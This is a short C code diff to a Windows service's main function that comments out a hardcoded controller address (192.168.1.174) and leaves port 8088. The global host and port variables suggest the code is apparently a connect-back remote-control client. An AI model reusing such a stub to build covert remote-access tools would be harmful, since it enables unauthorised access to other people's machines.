@@ -37,7 +37,7 @@ LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 
 DWORD WINAPI main(char *lpServiceName)
 {
-	strcpy(g_strHost, "192.168.1.174");
+	//strcpy(g_strHost, "192.168.1.174");
 	g_dwPort = 8088;
 	// lpServiceName,在ServiceMain返回后就没有了
 	char	strServiceName[256] = {0};
